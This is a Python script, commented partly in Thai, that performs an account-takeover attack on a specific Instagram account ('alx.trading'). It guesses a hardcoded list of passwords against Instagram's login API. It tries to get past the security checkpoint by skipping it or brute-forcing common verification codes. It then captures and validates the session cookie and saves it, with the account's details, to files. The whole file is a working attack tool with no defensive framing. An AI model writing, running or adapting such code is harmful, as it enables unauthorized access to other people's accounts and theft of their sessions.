#!/usr/bin/env python3
"""
STABLE CHECKPOINT BYPASS ENGINE
ระบบ bypass checkpoint ที่เสถียรและมีประสิทธิภาพ
"""

import requests
import json
import time
import random
import threading
from datetime import datetime
import signal
import sys

class StableBypassEngine:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.running = True
        self.results = []
        
        # Setup signal handler for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Valid passwords
        self.passwords = ["Fleming654", "Fleming786", "Fleming1004", "Fleming1060", "Fleming1182", "Fleming1998"]
        
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print("\n🛑 Graceful shutdown initiated...")
        self.running = False
        self.save_results()
        sys.exit(0)
    
    def save_results(self):
        """บันทึกผลลัพธ์"""
        if self.results:
            filename = f"bypass_results_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"💾 Results saved to {filename}")
    
    def setup_session(self):
        """เตรียม session"""
        try:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            
            # Get CSRF token
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"✅ CSRF token obtained")
                return True
            else:
                print("❌ Failed to get CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ Session setup error: {e}")
            return False
    
    def attempt_login(self, username, password):
        """ลอง login และตรวจสอบ checkpoint"""
        try:
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=30
            )
            
            result = {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'timestamp': datetime.now().isoformat(),
                'success': False,
                'checkpoint_url': None,
                'sessionid': None
            }
            
            print(f"\n🔄 Login attempt: {username}:{password}")
            print(f"   Status: {response.status_code}")
            
            # ตรวจสอบ sessionid
            if 'sessionid' in self.session.cookies:
                sessionid = self.session.cookies['sessionid']
                result['sessionid'] = sessionid
                result['success'] = True
                print(f"   🎯 SUCCESS! SessionID: {sessionid[:30]}...")
                return result
            
            # ตรวจสอบ checkpoint
            try:
                resp_json = response.json()
                
                if "checkpoint_required" in str(resp_json):
                    checkpoint_url = resp_json.get('checkpoint_url', '')
                    result['checkpoint_url'] = checkpoint_url
                    print(f"   🔒 Checkpoint: {checkpoint_url}")
                    
                    # ลอง bypass checkpoint
                    bypass_success = self.attempt_checkpoint_bypass(checkpoint_url)
                    result['bypass_attempted'] = True
                    result['bypass_success'] = bypass_success
                    
                    if bypass_success:
                        result['success'] = True
                        if 'sessionid' in self.session.cookies:
                            result['sessionid'] = self.session.cookies['sessionid']
                
                result['response_data'] = resp_json
                
            except json.JSONDecodeError:
                result['response_text'] = response.text[:200]
                print(f"   ❌ Non-JSON response")
            
            return result
            
        except Exception as e:
            print(f"   ❌ Login error: {e}")
            return {
                'username': username,
                'password': password,
                'error': str(e),
                'timestamp': datetime.now().isoformat(),
                'success': False
            }
    
    def attempt_checkpoint_bypass(self, checkpoint_url):
        """ลอง bypass checkpoint"""
        print(f"   🔄 Attempting checkpoint bypass...")
        
        try:
            # วิธีที่ 1: ลอง skip checkpoint
            skip_data = {'choice': '1'}  # ลองเลือก option 1
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': f'https://www.instagram.com{checkpoint_url}'
            }
            
            response = self.session.post(
                f'https://www.instagram.com{checkpoint_url}',
                data=skip_data,
                headers=headers,
                timeout=30
            )
            
            # ตรวจสอบว่าได้ sessionid มั้ย
            if 'sessionid' in self.session.cookies:
                sessionid = self.session.cookies['sessionid']
                print(f"   ✅ Bypass SUCCESS! SessionID: {sessionid[:30]}...")
                return True
            
            # วิธีที่ 2: ลอง common verification codes
            common_codes = ["123456", "000000", "111111"]
            
            for code in common_codes:
                if not self.running:
                    break
                    
                verify_data = {'security_code': code}
                
                response = self.session.post(
                    f'https://www.instagram.com{checkpoint_url}',
                    data=verify_data,
                    headers=headers,
                    timeout=30
                )
                
                if 'sessionid' in self.session.cookies:
                    sessionid = self.session.cookies['sessionid']
                    print(f"   ✅ Code {code} SUCCESS! SessionID: {sessionid[:30]}...")
                    return True
                
                time.sleep(1)
            
            print(f"   ❌ Checkpoint bypass failed")
            return False
            
        except Exception as e:
            print(f"   ❌ Bypass error: {e}")
            return False
    
    def run_bypass_campaign(self, username="alx.trading"):
        """รันการ bypass แบบครบวงจร"""
        print(f"🚀 STABLE CHECKPOINT BYPASS ENGINE")
        print(f"Target: {username}")
        print(f"Passwords to test: {len(self.passwords)}")
        print("=" * 50)
        
        if not self.setup_session():
            print("❌ Failed to setup session")
            return
        
        for i, password in enumerate(self.passwords, 1):
            if not self.running:
                break
                
            print(f"\n--- Attempt {i}/{len(self.passwords)} ---")
            
            result = self.attempt_login(username, password)
            self.results.append(result)
            
            if result.get('success'):
                print(f"🎉 BREAKTHROUGH with {password}!")
                
                # บันทึกผลลัพธ์สำเร็จทันที
                success_data = {
                    "target": username,
                    "successful_password": password,
                    "sessionid": result.get('sessionid', ''),
                    "method": "checkpoint_bypass",
                    "timestamp": result['timestamp']
                }
                
                with open(f"BYPASS_SUCCESS_{username}_{password}_{int(time.time())}.json", 'w') as f:
                    json.dump(success_data, f, indent=2)
                
                print(f"💾 Success data saved!")
                
                # ทดสอบ session ที่ได้
                self.test_extracted_session(result.get('sessionid'))
                
                break
            
            # พักระหว่างการทดสอบ
            if i < len(self.passwords):  # ไม่ต้องรอถ้าเป็นการทดสอบสุดท้าย
                wait_time = random.uniform(5, 10)
                print(f"   ⏳ Waiting {wait_time:.1f}s before next attempt...")
                time.sleep(wait_time)
        
        # บันทึกผลรวม
        self.save_results()
        
        # สรุปผลลัพธ์
        successful = [r for r in self.results if r.get('success')]
        
        print(f"\n📊 CAMPAIGN RESULTS:")
        print(f"   Total attempts: {len(self.results)}")
        print(f"   Successful: {len(successful)}")
        print(f"   Success rate: {len(successful)/len(self.results)*100:.1f}%" if self.results else "0%")
        
        if successful:
            print(f"\n🎯 SUCCESSFUL BYPASSES:")
            for result in successful:
                sessionid = result.get('sessionid', 'N/A')
                print(f"   ✅ {result['password']} -> {sessionid[:30]}...")
    
    def test_extracted_session(self, sessionid):
        """ทดสอบ session ที่ดึงมาได้"""
        if not sessionid:
            return
            
        print(f"\n🧪 Testing extracted session...")
        
        try:
            from instagrapi import Client
            
            cl = Client()
            cl.login_by_sessionid(sessionid)
            
            user_info = cl.account_info()
            print(f"   ✅ Session VALID!")
            print(f"   👤 Username: {user_info.username}")
            print(f"   📝 Full name: {user_info.full_name}")
            print(f"   👥 Followers: {user_info.follower_count}")
            print(f"   👥 Following: {user_info.following_count}")
            
            # บันทึก verified session
            verified_session = {
                "sessionid": sessionid,
                "ds_user_id": str(cl.user_id),
                "username": user_info.username,
                "full_name": user_info.full_name,
                "follower_count": user_info.follower_count,
                "verified_at": datetime.now().isoformat(),
                "status": "verified_working"
            }
            
            with open(f"verified_session_{user_info.username}_{int(time.time())}.json", 'w') as f:
                json.dump(verified_session, f, indent=2)
            
            print(f"   💾 Verified session saved!")
            
        except Exception as e:
            print(f"   ❌ Session test failed: {e}")

def main():
    print("🎯 STABLE CHECKPOINT BYPASS ENGINE")
    print("=" * 50)
    
    engine = StableBypassEngine()
    
    try:
        engine.run_bypass_campaign("alx.trading")
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user")
        engine.save_results()

if __name__ == "__main__":
    main()
